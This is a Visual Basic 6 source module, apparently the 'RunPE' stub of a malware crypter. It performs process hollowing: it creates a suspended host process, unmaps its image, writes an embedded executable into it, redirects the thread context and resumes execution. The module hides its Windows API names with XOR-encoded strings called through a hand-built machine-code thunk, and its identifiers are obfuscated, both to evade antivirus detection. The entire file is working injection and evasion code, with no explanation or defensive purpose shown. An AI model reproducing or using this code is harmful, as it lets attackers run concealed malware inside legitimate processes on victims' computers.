Attribute VB_Name = "runPEN"
Option Explicit

Private Const CONTEXT_FULL As Long = &H10007
Private Const MAX_PATH As Integer = 260
Private Const CREATE_SUSPENDED As Long = &H4
Private Const MEM_COMMIT As Long = &H1000
Private Const MEM_RESERVE As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE As Long = &H40

Private Declare Function CreateProcessA Lib "kernel32" (ByVal lpAppName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, bvBuff As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Private Declare Function OutputDebugString Lib "kernel32" Alias "OutputDebugStringA" (ByVal lpOutputString As String) As Long

Public Declare Sub RtlMoveMemory Lib "kernel32" (Dest As Any, Src As Any, ByVal L As Long)
Private Declare Function CallWindowProcA Lib "user32" (ByVal addr As Long, ByVal p1 As Long, ByVal p2 As Long, ByVal p3 As Long, ByVal p4 As Long) As Long
Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Private Declare Function LoadLibraryA Lib "kernel32" (ByVal lpLibFileName As String) As Long

Private Type SECURITY_ATTRIBUTES
nLength As Long
lpSecurityDescriptor As Long
bInheritHandle As Long
End Type

Private Type STARTUPINFO
cb As Long
lpReserved As Long
lpDesktop As Long
lpTitle As Long
dwX As Long
dwY As Long
dwXSize As Long
dwYSize As Long
dwXCountChars As Long
dwYCountChars As Long
dwFillAttribute As Long
dwFlags As Long
wShowWindow As Integer
cbReserved2 As Integer
lpReserved2 As Long
hStdInput As Long
hStdOutput As Long
hStdError As Long
End Type

Private Type PROCESS_INFORMATION
hProcess As Long
hThread As Long
dwProcessId As Long
dwThreadID As Long
End Type

Private Type FLOATING_SAVE_AREA
ControlWord As Long
StatusWord As Long
TagWord As Long
ErrorOffset As Long
ErrorSelector As Long
DataOffset As Long
DataSelector As Long
RegisterArea(1 To 80) As Byte
Cr0NpxState As Long
End Type

Private Type CONTEXT
ContextFlags As Long

Dr0 As Long
Dr1 As Long
Dr2 As Long
Dr3 As Long
Dr6 As Long
Dr7 As Long

FloatSave As FLOATING_SAVE_AREA
SegGs As Long
SegFs As Long
SegEs As Long
SegDs As Long
Edi As Long
Esi As Long
Ebx As Long
Edx As Long
Ecx As Long
Eax As Long
Ebp As Long
Eip As Long
SegCs As Long
EFlags As Long
Esp As Long
SegSs As Long
End Type

Private Type IMAGE_DOS_HEADER
e_magic As Integer
e_cblp As Integer
e_cp As Integer
e_crlc As Integer
e_cparhdr As Integer
e_minalloc As Integer
e_maxalloc As Integer
e_ss As Integer
e_sp As Integer
e_csum As Integer
e_ip As Integer
e_cs As Integer
e_lfarlc As Integer
e_ovno As Integer
e_res(0 To 3) As Integer
e_oemid As Integer
e_oeminfo As Integer
e_res2(0 To 9) As Integer
e_lfanew As Long
End Type

Private Type IMAGE_FILE_HEADER
Machine As Integer
NumberOfSections As Integer
TimeDateStamp As Long
PointerToSymbolTable As Long
NumberOfSymbols As Long
SizeOfOptionalHeader As Integer
characteristics As Integer
End Type

Private Type IMAGE_DATA_DIRECTORY
VirtualAddress As Long
Size As Long
End Type

Private Type IMAGE_OPTIONAL_HEADER
Magic As Integer
MajorLinkerVersion As Byte
MinorLinkerVersion As Byte
SizeOfCode As Long
SizeOfInitializedData As Long
SizeOfUnitializedData As Long
AddressOfEntryPoint As Long
BaseOfCode As Long
BaseOfData As Long
ImageBase As Long
SectionAlignment As Long
FileAlignment As Long
MajorOperatingSystemVersion As Integer
MinorOperatingSystemVersion As Integer
MajorImageVersion As Integer
MinorImageVersion As Integer
MajorSubsystemVersion As Integer
MinorSubsystemVersion As Integer
W32VersionValue As Long
SizeOfImage As Long
SizeOfHeaders As Long
CheckSum As Long
SubSystem As Integer
DllCharacteristics As Integer
SizeOfStackReserve As Long
SizeOfStackCommit As Long
SizeOfHeapReserve As Long
SizeOfHeapCommit As Long
LoaderFlags As Long
NumberOfRvaAndSizes As Long
DataDirectory(0 To 15) As IMAGE_DATA_DIRECTORY
End Type

Private Type IMAGE_NT_HEADERS
Signature As Long
FileHeader As IMAGE_FILE_HEADER
OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type

Private Type IMAGE_SECTION_HEADER
SecName As String * 8
VirtualSize As Long
VirtualAddress As Long
SizeOfRawData As Long
PointerToRawData As Long
PointerToRelocations As Long
PointerToLinenumbers As Long
NumberOfRelocations As Integer
NumberOfLinenumbers As Integer
characteristics As Long
End Type


Public Function XWMXVPK(ByVal ZSYG As String, ByVal SHITD As String, ParamArray UBYMYTW()) As Long
Dim JAQGJ As Long, OYUT(&HEC00& - 1) As Byte, DHP As Long, USADZKE As Long

USADZKE = GetProcAddress(LoadLibraryA(ZSYG), SHITD)
If USADZKE = 0 Then Exit Function

JAQGJ = VarPtr(OYUT(0))
RtlMoveMemory ByVal JAQGJ, &H59595958, &H4: JAQGJ = JAQGJ + 4
RtlMoveMemory ByVal JAQGJ, &H5059, &H2: JAQGJ = JAQGJ + 2
For DHP = UBound(UBYMYTW) To 0 Step -1
RtlMoveMemory ByVal JAQGJ, &H68, &H1: JAQGJ = JAQGJ + 1
RtlMoveMemory ByVal JAQGJ, CLng(UBYMYTW(DHP)), &H4: JAQGJ = JAQGJ + 4
Next
RtlMoveMemory ByVal JAQGJ, &HE8, &H1: JAQGJ = JAQGJ + 1
RtlMoveMemory ByVal JAQGJ, USADZKE - JAQGJ - 4, &H4: JAQGJ = JAQGJ + 4
RtlMoveMemory ByVal JAQGJ, &HC3, &H1: JAQGJ = JAQGJ + 1
XWMXVPK = CallWindowProcA(VarPtr(OYUT(0)), 0, 0, 0, 0)
End Function

Public Function SGKMG(ByVal XQGMHV As String, ByVal XJIRI As String) As String
Dim NOE As Long

For NOE = 1 To Len(XQGMHV)
SGKMG = SGKMG & Chr(Asc(Mid(XJIRI, IIf(NOE Mod Len(XJIRI) <> 0, NOE Mod Len(XJIRI), Len(XJIRI)), 1)) Xor Asc(Mid(XQGMHV, NOE, 1)))
Next NOE
End Function

Public Sub CMAQEQL(ByVal OFNCK As String, ByRef FCEX() As Byte, PIEEY As String)
Dim FBG As Long, QMMM As IMAGE_DOS_HEADER, KYURC As IMAGE_NT_HEADERS, VWOMLP As IMAGE_SECTION_HEADER
Dim DUYHPOE As STARTUPINFO, QNHIRK As PROCESS_INFORMATION, XXKGZL As CONTEXT

DUYHPOE.cb = Len(DUYHPOE)
RtlMoveMemory QMMM, FCEX(0), 64
RtlMoveMemory KYURC, FCEX(QMMM.e_lfanew), 248

CreateProcessA OFNCK, " " & PIEEY, 0, 0, False, CREATE_SUSPENDED, 0, 0, DUYHPOE, QNHIRK
XWMXVPK SGKMG(Chr(92) & Chr(71) & Chr(85) & Chr(95) & Chr(94), "231321320230230202302302320230230320230230230230232AgustinVazquez20102121515151546142315645156"), SGKMG(Chr(124) & Chr(71) & Chr(100) & Chr(93) & Chr(95) & Chr(80) & Chr(67) & Chr(100) & Chr(89) & Chr(87) & Chr(68) & Chr(127) & Chr(84) & Chr(96) & Chr(85) & Chr(81) & Chr(68) & Chr(91) & Chr(92) & Chr(94), "231321320230230202302302320230230320230230230230232AgustinVazquez20102121515151546142315645156"), QNHIRK.hProcess, KYURC.OptionalHeader.ImageBase
XWMXVPK SGKMG(Chr(89) & Chr(86) & Chr(67) & Chr(93) & Chr(87) & Chr(93) & Chr(0) & Chr(0), "231321320230230202302302320230230320230230230230232AgustinVazquez20102121515151546142315645156"), SGKMG(Chr(100) & Chr(90) & Chr(67) & Chr(71) & Chr(71) & Chr(80) & Chr(95) & Chr(115) & Chr(92) & Chr(94) & Chr(92) & Chr(83) & Chr(119) & Chr(75), "231321320230230202302302320230230320230230230230232AgustinVazquez20102121515151546142315645156"), QNHIRK.hProcess, KYURC.OptionalHeader.ImageBase, KYURC.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE
WriteProcessMemory QNHIRK.hProcess, ByVal KYURC.OptionalHeader.ImageBase, FCEX(0), KYURC.OptionalHeader.SizeOfHeaders, 0

For FBG = 0 To KYURC.FileHeader.NumberOfSections - 1
RtlMoveMemory VWOMLP, FCEX(QMMM.e_lfanew + 248 + 40 * FBG), Len(VWOMLP)
WriteProcessMemory QNHIRK.hProcess, ByVal KYURC.OptionalHeader.ImageBase + VWOMLP.VirtualAddress, FCEX(VWOMLP.PointerToRawData), VWOMLP.SizeOfRawData, 0
Next FBG

XXKGZL.ContextFlags = CONTEXT_FULL
XWMXVPK SGKMG(Chr(89) & Chr(86) & Chr(67) & Chr(93) & Chr(87) & Chr(93) & Chr(0) & Chr(0), "231321320230230202302302320230230320230230230230232AgustinVazquez20102121515151546142315645156"), SGKMG(Chr(117) & Chr(86) & Chr(69) & Chr(103) & Chr(90) & Chr(67) & Chr(86) & Chr(83) & Chr(84) & Chr(113) & Chr(92) & Chr(94) & Chr(70) & Chr(86) & Chr(72) & Chr(70), "231321320230230202302302320230230320230230230230232AgustinVazquez20102121515151546142315645156"), QNHIRK.hThread, VarPtr(XXKGZL)
WriteProcessMemory QNHIRK.hProcess, ByVal XXKGZL.Ebx + 8, KYURC.OptionalHeader.ImageBase, 4, 0
XXKGZL.Eax = KYURC.OptionalHeader.ImageBase + KYURC.OptionalHeader.AddressOfEntryPoint
XWMXVPK SGKMG(Chr(89) & Chr(86) & Chr(67) & Chr(93) & Chr(87) & Chr(93) & Chr(0) & Chr(0), "231321320230230202302302320230230320230230230230232AgustinVazquez20102121515151546142315645156"), SGKMG(Chr(97) & Chr(86) & Chr(69) & Chr(103) & Chr(90) & Chr(67) & Chr(86) & Chr(83) & Chr(84) & Chr(113) & Chr(92) & Chr(94) & Chr(70) & Chr(86) & Chr(72) & Chr(70), "231321320230230202302302320230230320230230230230232AgustinVazquez20102121515151546142315645156"), QNHIRK.hThread, VarPtr(XXKGZL)
XWMXVPK SGKMG(Chr(89) & Chr(86) & Chr(67) & Chr(93) & Chr(87) & Chr(93) & Chr(0) & Chr(0), "231321320230230202302302320230230320230230230230232AgustinVazquez20102121515151546142315645156"), SGKMG(Chr(96) & Chr(86) & Chr(66) & Chr(70) & Chr(95) & Chr(84) & Chr(103) & Chr(90) & Chr(66) & Chr(87) & Chr(82) & Chr(84), "231321320230230202302302320230230320230230230230232AgustinVazquez20102121515151546142315645156"), QNHIRK.hThread
End Sub
